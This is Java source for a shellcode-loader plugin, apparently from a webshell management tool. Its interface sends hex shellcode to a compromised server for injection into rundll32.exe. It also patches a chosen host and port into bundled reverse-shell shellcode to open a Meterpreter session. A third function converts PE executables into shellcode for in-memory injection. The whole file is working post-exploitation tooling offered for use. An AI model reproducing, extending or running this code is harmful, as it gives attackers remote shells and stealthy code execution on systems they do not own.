package shells.plugins.generic;

import com.kichik.pecoff4j.PE;
import com.kichik.pecoff4j.io.PEParser;
import core.EasyI18N;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.border.TitledBorder;
import org.fife.ui.rtextarea.RTextArea;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;













public abstract class ShellcodeLoader
  implements Plugin
{
  private static final String spawnto_x86 = "C:\\Windows\\SysWOW64\\rundll32.exe";
  private static final String spawnto_x64 = "C:\\Windows\\System32\\rundll32.exe";
  protected JPanel panel;
  protected JButton loadButton;
  protected JButton runButton;
  protected JSplitPane splitPane;
  protected JSplitPane meterpreterSplitPane;
  protected RTextArea shellcodeTextArea;
  protected boolean loadState;
  protected ShellEntity shellEntity;
  protected Payload payload;
  protected Encoding encoding;
  public ShellcodeLoader childLoder;
  private JPanel shellcodeLoaderPanel;
  private JPanel meterpreterPanel;
  private JPanel memoryPePanel;
  
  public ShellcodeLoader() {
    this.panel = new JPanel(new BorderLayout());
    this.shellcodeLoaderPanel = new JPanel(new BorderLayout());
    this.meterpreterPanel = new JPanel(new BorderLayout());
    this.memoryPePanel = new JPanel(new BorderLayout());

    
    this.excuteFileLabel = new JLabel("注入进程文件: ");
    this.excuteFileTextField = new JTextField("C:\\Windows\\System32\\rundll32.exe", 50);

    
    this.hostLabel = new JLabel("host :");
    this.portLabel = new JLabel("port :");
    this.archLabel = new JLabel(String.format("Arch:%s", new Object[] { "none" }));
    this.arch2Label = new JLabel(String.format("Arch:%s", new Object[] { "none" }));
    this.loadButton = new JButton("Load");
    this.runButton = new JButton("Run");
    this.goButton = new JButton("Go");
    this.loadPeButton = new JButton("LoadPe");

    
    this.argsLabel = new JLabel("args");
    this.readWaitLabel = new JLabel("readWait(ms)");
    this.argsTextField = new JTextField("");
    this.readWaitTextField = new JTextField("7000");
    this.memoryPeTextArea = new RTextArea();
    this.shellcodeTextArea = new RTextArea();
    this.meterpreterSplitPane = new JSplitPane();
    this.tipTextArea = new RTextArea();
    this.hostTextField = new JTextField("127.0.0.1", 15);
    this.portTextField = new JTextField("4444", 7);
    this.splitPane = new JSplitPane();
    this.tabbedPane = new JTabbedPane();
    
    this.splitPane.setOrientation(0);
    this.splitPane.setDividerSize(0);
    
    this.meterpreterSplitPane.setOrientation(0);
    this.meterpreterSplitPane.setDividerSize(0);


    
    JPanel topPanel = new JPanel();
    topPanel.add(this.excuteFileLabel);
    topPanel.add(this.excuteFileTextField);

    
    topPanel.add(this.arch2Label);


    
    topPanel.add(this.loadButton);
    topPanel.add(this.runButton);
    
    this.splitPane.setTopComponent(topPanel);
    this.splitPane.setBottomComponent((Component)new RTextScrollPane((RTextArea)this.shellcodeTextArea));
    
    this.splitPane.addComponentListener(new ComponentAdapter()
        {
          public void componentResized(ComponentEvent e) {
            ShellcodeLoader.this.splitPane.setDividerLocation(0.15D);
          }
        });
    
    this.shellcodeTextArea.setAutoscrolls(true);
    this.shellcodeTextArea.setBorder(new TitledBorder("shellcode hex"));
    this.shellcodeTextArea.setText("");
    
    this.tipTextArea.setAutoscrolls(true);
    this.tipTextArea.setBorder(new TitledBorder("tip"));
    this.tipTextArea.setText("");
    
    this.shellcodeLoaderPanel.add(this.splitPane);

    
    JPanel meterpreterTopPanel = new JPanel();
    meterpreterTopPanel.add(this.hostLabel);
    meterpreterTopPanel.add(this.hostTextField);
    meterpreterTopPanel.add(this.portLabel);
    meterpreterTopPanel.add(this.portTextField);
    meterpreterTopPanel.add(this.archLabel);
    meterpreterTopPanel.add(this.goButton);
    
    this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
    this.meterpreterSplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
    
    this.meterpreterPanel.add(this.meterpreterSplitPane);

    
    topPanel = new JPanel();
    topPanel.add(this.argsLabel);
    topPanel.add(this.argsTextField);
    topPanel.add(this.readWaitLabel);
    topPanel.add(this.readWaitTextField);
    topPanel.add(this.loadPeButton);

    
    JSplitPane _splitPane = new JSplitPane(0);
    
    _splitPane.setTopComponent(topPanel);
    _splitPane.setBottomComponent((Component)new RTextScrollPane((RTextArea)this.memoryPeTextArea));
    
    this.memoryPePanel.add(_splitPane);
    
    this.tabbedPane.addTab("shellcodeLoader", this.shellcodeLoaderPanel);
    this.tabbedPane.addTab("meterpreter", this.meterpreterPanel);
    this.tabbedPane.addTab("memoryPe", this.memoryPePanel);
    
    this.panel.add(this.tabbedPane);
  }
  protected JTabbedPane tabbedPane; private RTextArea tipTextArea; private JButton goButton; private JLabel hostLabel; private JLabel portLabel; private JTextField hostTextField; private JTextField portTextField; private JLabel archLabel; private JLabel excuteFileLabel; private JLabel arch2Label; private JTextField excuteFileTextField; private RTextArea memoryPeTextArea; private JButton loadPeButton; private JLabel argsLabel; private JLabel readWaitLabel; private JTextField argsTextField; private JTextField readWaitTextField;
  
  public abstract boolean load();
  
  public abstract String getClassName();
  
  private void loadButtonClick(ActionEvent actionEvent) {
    if (!this.loadState) {
      try {
        if (load()) {
          this.loadState = true;
          GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
        } else {
          GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
        } 
      } catch (Exception e) {
        Log.error(e);
        GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
      } 
    } else {
      
      GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
    } 
  }
  private void runButtonClick(ActionEvent actionEvent) {
    if (!this.loadState && 
      "C:\\Windows\\SysWOW64\\rundll32.exe".equals(this.excuteFileTextField.getText()) && 
      this.payload.getFileSize("C:\\Windows\\SysWOW64\\rundll32.exe") <= 0) {
      this.excuteFileTextField.setText("C:\\Windows\\System32\\rundll32.exe");
    }

    
    load();
    String shellcodeHex = this.shellcodeTextArea.getText().trim();
    if (shellcodeHex.length() > 0) {
      byte[] result = runShellcode(functions.hexToByte(shellcodeHex));
      String resultString = this.encoding.Decoding(result);
      Log.log(resultString, new Object[0]);
      GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
    } 
  }
  private void goButtonClick(ActionEvent actionEvent) {
    try {
      String host = this.hostTextField.getText().trim();
      int port = Integer.parseInt(this.portTextField.getText());
      boolean is64 = this.payload.isX64();
      String shellcodeHexString = getMeterpreterShellcodeHex(host, port, is64);
      byte[] result = runShellcode(functions.hexToByte(shellcodeHexString));
      String resultString = this.encoding.Decoding(result);
      Log.log(resultString, new Object[0]);
      GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
    } catch (Exception e) {
      GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
    } 
  }
  
  private void loadPeButtonClick(ActionEvent actionEvent) {
    GFileChooser chooser = new GFileChooser();
    
    chooser.setFileSelectionMode(0);
    boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
    File selectdFile = chooser.getSelectedFile();
    if (flag && selectdFile != null) {
      String fileString = selectdFile.getAbsolutePath();
      try {
        int readWait = Integer.parseInt(this.readWaitTextField.getText().trim());
        String args = this.argsTextField.getText().trim();
        String excuteFile = this.excuteFileTextField.getText();
        
        String command = excuteFile + " " + args;
        
        byte[] peContent = functions.readInputStreamAutoClose(new FileInputStream(fileString));
        try {
          this.memoryPeTextArea.append(String.format("%s\n", new Object[] { new String(runPe(command, peContent, readWait)) }));
        } catch (Exception e) {
          GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.memoryPePanel), e.getMessage());
        }
      
      } catch (Exception e) {
        this.memoryPeTextArea.append(String.format("%s\n", new Object[] { functions.printStackTrace(e) }));
      } 
    } 
  }
  
  private byte[] runShellcode(byte[] shellcode) {
    return runShellcode(this.excuteFileTextField.getText(), shellcode, 0);
  }
  private byte[] runShellcode(long injectPid, byte[] shellcode) {
    load();
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("type", "pid");
    reqParameter.add("shellcode", shellcode);
    reqParameter.add("excuteFile", this.excuteFileTextField.getText());
    byte[] result = this.payload.evalFunc(getClassName(), "run", reqParameter);
    return result;
  }
  public byte[] runShellcode(String command, byte[] shellcode, int readWait) {
    return runShellcode(new ReqParameter(), command, shellcode, readWait);
  }
  public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
    if (this.childLoder != null) {
      return this.childLoder.runShellcode(reqParameter, command, shellcode, readWait);
    }
    load();
    if (command == null || command.trim().isEmpty()) {
      reqParameter.add("type", "local");
    } else {
      reqParameter.add("excuteFile", command);
      reqParameter.add("type", "start");
    } 
    reqParameter.add("shellcode", shellcode);
    reqParameter.add("readWaitTime", Integer.toString(readWait));
    byte[] result = this.payload.evalFunc(getClassName(), "run", reqParameter);
    return result;
  }
  public byte[] runPe(byte[] pe) throws Exception {
    return runPe(this.excuteFileTextField.getText(), pe, 0);
  }
  public byte[] runPe(String command, byte[] pe, int readWait) throws Exception {
    if (pe == null || command == null || command.trim().isEmpty()) {
      throw new UnsupportedOperationException(EasyI18N.getI18nString("只支持远程注入!!!"));
    }
    PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
    if (this.payload.isX64() == peContext.is64()) {
      StringBuilder stringBuilder = new StringBuilder();
      byte[] shellcode = PeLoader.peToShellcode(pe, stringBuilder);
      this.memoryPeTextArea.append(stringBuilder.toString());
      if (shellcode != null) {
        byte[] result = runShellcode(command, shellcode, readWait);
        return result;
      } 
      throw new UnsupportedOperationException(EasyI18N.getI18nString("PeToShellcode时 发生错误!"));
    } 
    
    throw new UnsupportedOperationException(String.format(EasyI18N.getI18nString("当前进程是Arch:%s Pe是%s"), new Object[] { this.payload.isX64() ? "x64" : "x86", peContext.is64() ? "x64" : "x86" }));
  }
  
  public byte[] runPe2(String args, byte[] pe, int readWait) throws Exception {
    if (pe == null || args == null || args.trim().isEmpty()) {
      throw new UnsupportedOperationException(EasyI18N.getI18nString("只支持远程注入!!!"));
    }
    PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
    if (this.payload.isX64() == peContext.is64()) {
      StringBuilder stringBuilder = new StringBuilder();
      byte[] shellcode = PeLoader.peToShellcode(pe, stringBuilder);
      this.memoryPeTextArea.append(stringBuilder.toString());
      if (shellcode != null) {
        byte[] result = runShellcode(this.excuteFileTextField.getText() + " " + args, shellcode, readWait);
        return result;
      } 
      throw new UnsupportedOperationException(EasyI18N.getI18nString("PeToShellcode时 发生错误!"));
    } 
    
    throw new UnsupportedOperationException(String.format(EasyI18N.getI18nString("当前进程是Arch:%s Pe是%s"), new Object[] { this.payload.isX64() ? "x64" : "x86", peContext.is64() ? "x64" : "x86" }));
  }



  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(ShellcodeLoader.class, this, ShellcodeLoader.class, this);
    this.arch2Label.setText(String.format("Arch:%s", new Object[] { this.payload.isX64() ? "x64" : "x86" }));
    this.archLabel.setText(String.format("Arch:%s", new Object[] { this.payload.isX64() ? "x64" : "x86" }));
    
    if (this.payload.isX64()) {
      this.excuteFileTextField.setText("C:\\Windows\\System32\\rundll32.exe");
    } else {
      this.excuteFileTextField.setText("C:\\Windows\\SysWOW64\\rundll32.exe");
    } 
    
    updateMeterpreterTip();
  }

  
  public JPanel getView() {
    return this.panel;
  }
  public String getMeterpreterShellcodeHex(String host, int port, boolean is64) {
    String shellcodeHex = "";
    try {
      InputStream inputStream = ShellcodeLoader.class.getResourceAsStream(String.format("assets/reverse%s.bin", new Object[] { is64 ? "64" : "" }));
      shellcodeHex = new String(functions.readInputStream(inputStream));
      inputStream.close();
      shellcodeHex = shellcodeHex.replace("{host}", functions.byteArrayToHex(functions.ipToByteArray(host)));
      shellcodeHex = shellcodeHex.replace("{port}", functions.byteArrayToHex(functions.shortToByteArray((short)port)));
    } catch (Exception e) {
      Log.error(e);
    } 
    return shellcodeHex;
  }
  private void updateMeterpreterTip() {
    try {
      boolean is64 = this.payload.isX64();
      InputStream inputStream = ShellcodeLoader.class.getResourceAsStream("assets/meterpreterTip.txt");
      String tipString = new String(functions.readInputStream(inputStream));
      inputStream.close();
      tipString = tipString.replace("{arch}", is64 ? "/x64" : "");
      this.tipTextArea.setText(tipString);
    } catch (Exception e) {
      Log.error(e);
    } 
  }
}
